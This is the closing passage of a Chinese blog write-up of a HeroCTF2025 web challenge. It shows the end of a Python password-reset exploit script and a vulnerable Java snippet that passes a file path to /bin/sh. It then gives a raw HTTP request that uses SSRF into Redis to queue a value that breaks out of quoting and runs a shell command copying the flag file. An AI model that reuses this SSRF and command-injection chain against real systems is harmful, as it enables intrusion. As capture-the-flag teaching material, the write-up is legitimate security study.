+    success <span class="token operator">=</span> exploit<span class="token punctuation">.</span>exploit<span class="token punctuation">(</span>TARGET_EMAIL<span class="token punctuation">,</span> NEW_PASSWORD<span class="token punctuation">)</span>
+    
+    <span class="token keyword">if</span> success<span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n[+] 攻击成功完成!"</span><span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n[-] 攻击失败"</span><span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+
+<p>后面就是redis 打SSRF，直接在http_method构造redis语句然后命令拼接到ClamAVService</p>
+<pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> command <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"clamscan --quiet '%s'"</span><span class="token punctuation">,</span> filePath<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token class-name">ProcessBuilder</span> processBuilder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ProcessBuilder</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> command<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+
+<pre class="language-none"><code class="language-none">POST &#x2F;api&#x2F;file&#x2F;remote-upload HTTP&#x2F;1.1
+Host: dyn01.heroctf.fr:12149
+Accept-Encoding: gzip, deflate
+Cookie: SESSION&#x3D;MThlOTBlYWMtZmZkYy00NDNjLThlOTMtYmFhMTViMjNlYjFl
+Priority: u&#x3D;0
+Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2
+User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko&#x2F;20100101 Firefox&#x2F;140.0
+Content-Type: application&#x2F;json
+Accept: *&#x2F;*
+Referer: http:&#x2F;&#x2F;dyn01.heroctf.fr:12149&#x2F;
+Origin: http:&#x2F;&#x2F;dyn01.heroctf.fr:12149
+Content-Length: 66
+
+&#123;&quot;url&quot;:&quot;http:&#x2F;&#x2F;localhost:6379&quot;,&quot;filename&quot;:&quot;11&quot;,&quot;httpMethod&quot;:&quot;RPUSH clamav_queue \&quot;&#x2F;etc&#x2F;passwd&#39;; cp &#x2F;app&#x2F;flag* &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;flag.txt #&#39;\&quot;\n&quot;&#125;</code></pre>
+
+<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251201153713.png" alt="image.png" loading="lazy"></p>
+</div></section><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>ta0</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="http://ta0.fun/posts/17991232/" title="HeroCTF2025">http://ta0.fun/posts/17991232/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/posts/23ac0af4/" rel="prev" title="IS2025"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">IS2025</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/posts/57292570/" rel="next" title="用友U8 Cloud FileManageServlet/LoginVideoServlet反序列化"><span class="post-nav-text">用友U8 Cloud FileManageServlet/LoginVideoServlet反序列化</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2025 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> ta0</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.1.1</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div><div id="busuanzi"><span id="busuanzi_container_site_uv" title="总访客量"><span><span class="icon iconify" data-icon="ri:user-line"></span></span><span id="busuanzi_value_site_uv"></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv" title="总访问量"><span><span class="icon iconify" data-icon="ri:eye-line"></span></span><span id="busuanzi_value_site_pv"></span></span><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
+  // Handle and trigger popup window
+  document.querySelector(".popup-trigger").addEventListener("click", () => {
+    document.querySelector(".popup").classList.add("show");
+    setTimeout(() => {
+      document.querySelector(".search-input").focus();
+    }, 100);
+  });
+
+  // Monitor main search box
+  const onPopupClose = () => {
+    document.querySelector(".popup").classList.remove("show");
+  };
+
+  document.querySelector(".popup-btn-close").addEventListener("click", () => {
+    onPopupClose();
+  });
+
+  window.addEventListener("keyup", event => {
+    if (event.key === "Escape") {
+      onPopupClose();
+    }
+  });
+});
+</script><script src="https://fastly.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script><script src="/js/search/local-search.js" defer type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="搜索..." value=""></div><div class="search-result-container"></div></div><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
+mediumZoom(images)</script><style>.medium-zoom-image {
+  z-index: 99;
+}</style></body></html>
